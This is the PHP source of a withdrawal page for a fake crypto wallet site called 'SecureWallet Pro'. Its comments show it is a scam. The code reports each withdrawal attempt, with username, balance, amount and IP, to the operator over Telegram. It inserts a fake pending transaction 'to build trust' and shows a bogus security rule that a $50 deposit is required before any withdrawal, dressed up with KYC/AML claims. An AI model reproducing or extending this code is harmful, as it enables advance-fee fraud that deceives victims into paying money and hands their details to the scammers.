<?php
require_once 'config.php';
if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}

// Fetch user data
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();

if (!$user) {
    header('Location: index.php');
    exit;
}

if ($_POST) {
    $method = $_POST['method'];
    $amount = floatval($_POST['amount']);
    
    // Log the attempt - they're trying to withdraw!
    $message = "💸 <b>WITHDRAWAL ATTEMPT - NEW METHOD</b>\n";
    $message .= "👤 User: {$user['username']}\n";
    $message .= "💰 Balance: $" . number_format($user['balance'], 2) . "\n";
    $message .= "📤 Method: $method\n";
    $message .= "💵 Amount: $$amount\n";
    $message .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "⏰ " . date('Y-m-d H:i:s T');
    sendTelegram($message);
    
    // Log fake failed transaction to build trust
    $db->prepare("INSERT INTO transactions (user_id, type, method, amount, status, details) VALUES (?, 'withdraw', ?, ?, 'pending', 'New method verification required')")
       ->execute([$_SESSION['user_id'], $method, $amount]);
    
    $_SESSION['withdraw_method'] = $method;
    $_SESSION['withdraw_amount'] = $amount;
    header('Location: withdraw_verification.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Withdrawal Method - SecureWallet Pro</title>
    <link rel="stylesheet" href="style.css">
    <style>
    .withdraw-new { background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%); min-height: 100vh; }
    .warning-box { background: #fef3c7; border: 2px solid #f59e0b; border-radius: 12px; padding: 20px; margin-bottom: 30px; }
    .warning-icon { font-size: 24px; color: #d97706; margin-right: 10px; }
    </style>
</head>
<body class="dashboard withdraw-new">
    <nav>
        <a href="withdraw.php" class="back">← Back to Withdraw</a>
        <a href="dashboard.php" class="dashboard-link">Dashboard</a>
    </nav>
    
    <div class="container">
        <h2>Add New Withdrawal Method</h2>
        
        <div class="warning-box">
            <span class="warning-icon">⚠️</span>
            <strong>Security Requirement:</strong> You must make a minimum $50 deposit first before adding new withdrawal methods.
        </div>
        
        <div class="withdraw-form-container">
            <form method="POST" class="withdraw-form">
                <div class="input-group large">
                    <label>Withdrawal Amount (USD)</label>
                    <div class="dollar-input">
                        <span>$</span>
                        <input type="number" name="amount" step="0.01" min="50" max="5000" 
                               placeholder="100.00" required value="100">
                    </div>
                    <small>Minimum $50</small>
                </div>
                
                <div class="method-selector">
                    <h3>Select Withdrawal Method</h3>
                    
                    <label class="method-option">
                        <input type="radio" name="method" value="bank" checked>
                        <div class="method-details">
                            <div class="icon">🏦</div>
                            <h4>Bank Account</h4>
                            <p>ACH / Wire Transfer (1-3 days)</p>
                        </div>
                    </label>
                    
                    <label class="method-option">
                        <input type="radio" name="method" value="crypto">
                        <div class="method-details">
                            <div class="icon">₿</div>
                            <h4>Cryptocurrency</h4>
                            <p>BTC, ETH, USDT (Instant)</p>
                        </div>
                    </label>
                </div>
                
                <button type="submit" class="btn-withdraw-large">
                    Continue to Verification → 
                </button>
            </form>
        </div>
        
        <div class="withdraw-info">
            <h4>Why verification is required:</h4>
            <ul>
                <li>✅ Prevents fraud & unauthorized withdrawals</li>
                <li>✅ Complies with KYC/AML regulations</li>
                <li>✅ Protects your funds</li>
            </ul>
        </div>
    </div>
</body>
</html>
